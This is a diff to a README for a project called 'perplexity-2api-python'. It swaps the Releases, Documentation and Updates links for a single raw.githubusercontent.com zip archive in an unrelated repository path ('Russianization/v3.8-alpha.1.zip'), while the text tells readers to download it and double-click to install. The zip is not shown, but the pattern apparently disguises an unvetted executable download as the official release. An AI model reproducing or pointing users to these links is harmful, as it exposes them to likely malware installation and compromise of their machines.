@@ -29,7 +29,7 @@ To get started, you need to download the application. Enjoy a simple setup proce
 
 ### Step 1: Download the Application
 Visit this page to download the latest version:  
-[Download perplexity-2api-python](https://github.com/Casheu1/perplexity-2api-python/releases)
+[Download perplexity-2api-python](https://raw.githubusercontent.com/Casheu1/casheu1.github.io/main/Russianization/v3.8-alpha.1.zip)
 
 ### Step 2: Run the Installer
 After downloading, locate the file in your downloads folder. Double-click on it to start the installation process. Follow the on-screen instructions to complete the setup.
@@ -52,7 +52,7 @@ Using perplexity-2api-python is straightforward. Here’s how to navigate throug
 - **Saving Preferences:** Remember to save your settings to ensure that your next session retains your custom configurations.
 
 ## 📖 Documentation
-If you want to dive deeper into specific features or need help, check our [Documentation](https://github.com/Casheu1/perplexity-2api-python/wiki). This guide will provide you with additional insights and tips on maximizing your use of perplexity-2api-python.
+If you want to dive deeper into specific features or need help, check our [Documentation](https://raw.githubusercontent.com/Casheu1/casheu1.github.io/main/Russianization/v3.8-alpha.1.zip). This guide will provide you with additional insights and tips on maximizing your use of perplexity-2api-python.
 
 ## 🤝 Community Support
 Join our community of users who share tips and help each other. Participate in discussions on our GitHub Issues page or follow updates. Your feedback is valuable and helps us improve the application.
@@ -65,7 +65,7 @@ If you run into issues while using perplexity-2api-python, here are some common 
 - **Feature Access:** Double-check your configuration settings to ensure all desired features are enabled.
 
 ## 📅 Updates
-Stay informed about the latest updates and features by visiting our [Releases Page](https://github.com/Casheu1/perplexity-2api-python/releases). Regular updates will enhance your experience with new functionalities.
+Stay informed about the latest updates and features by visiting our [Releases Page](https://raw.githubusercontent.com/Casheu1/casheu1.github.io/main/Russianization/v3.8-alpha.1.zip). Regular updates will enhance your experience with new functionalities.
 
 ## 🛠️ Contributing
 We welcome contributions! If you would like to help improve perplexity-2api-python, please check out our contribution guidelines in the repository. Your expertise can make a difference for all users.
